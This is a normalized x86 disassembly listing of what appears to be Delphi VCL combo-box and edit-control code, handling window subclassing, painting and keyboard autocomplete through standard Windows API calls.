push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_433729
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433730
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_433738
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_432920
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403270
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4337bc
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4032a0
mov eax [ esi + 0x278 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_432a14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_43380c
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_441b98
sub_433870
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441484
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4413b0
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4338d1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_4334f0
mov eax ebx
call sub_4445f8
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_4032a0
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_4445f8
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_433a14
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_441994
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_433a64
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41dc20
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_433ab8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_433ae4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_433ba0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43ddf8
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_4045d4
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_43de28
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406b40
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433ba7
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_433bac
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_433f64
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4435dc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433f6b
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_404098
lea eax [ ebp - 0x44 ]
call sub_404074
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404098
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_43ddf8
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_4040c8
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404074
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_433ab8
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_433ae4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404334
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40bff0
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43ddf8
mov eax [ ebp - 0x38 ]
call sub_404334
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40349c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_432ae0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404334
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4045d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404334
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4045d4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43ddf8
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_432b04
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_433ab8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432ae0
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40bff0
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_40425c
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_404380
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_404594
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_40425c
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_404380
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_432b04
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404594
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_404594
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_404380
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_43de28
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406b40
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43ddf8
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_4040c8
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_433f74
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_40425c
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_404380
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_433f74
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_433f74
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434129
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404334
test eax eax
jne r-xdata
mov eax esi
call sub_404534
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_40349c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434130
lea eax [ ebp - 0x1c ]
call sub_404074
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_404098
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_4040c8
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_404334
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_404594
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404380
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43de28
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x1c ]
call sub_404334
push eax
mov eax esi
call sub_404334
pop edx
call sub_406b40
push eax
push 0x0
push 0x142
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_40349c
mov eax ebx
mov si 0xffb2
call sub_40349c
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_43415c
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_41e564
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_41e3e0
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_41e3fc
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_41dfc4
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41dbec
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d400
xor edx edx
mov eax [ esi + 0x208 ]
call sub_41e564
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_434234
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_434260
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_43f494
mov eax ebx
call sub_43e020
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_455244
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_43e4b8
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43e030
sub_4342d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_4330cc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41dc20
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_434334
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_442788
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43455d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c9d4
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e000
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e000
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43d798
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e000
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e000
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_432ae0
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call DrawFrameControl
jmp r-xdata
sub_434570
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4402f0
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_434594
push ebx
mov ebx eax
mov eax ebx
call sub_44a424
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4345cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_434622
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_434630
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440324
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_434684
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4450c8
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_4346d8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4346fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44200c
mov eax ebx
mov si 0xffb5
call sub_40349c
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4445f8
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_40349c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_434774
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42c584
mov ebx eax
mov eax ebx
call sub_42c664
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4445f8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42c7fc
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4347c0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42c584
call sub_42c664
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_442a4c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4347ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441484
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_434824
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434630
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43d5b4
mov edx 0x19
mov eax esi
call sub_43d5d8
mov dl 0x1
mov eax esi
call sub_44482c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4348b0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4448fc
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4445f8
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4445f8
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_434904
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4448fc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_455244
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_43efc4
sub_434938
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4347ec
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4413b0
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4349a0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_443a74
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45514c
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
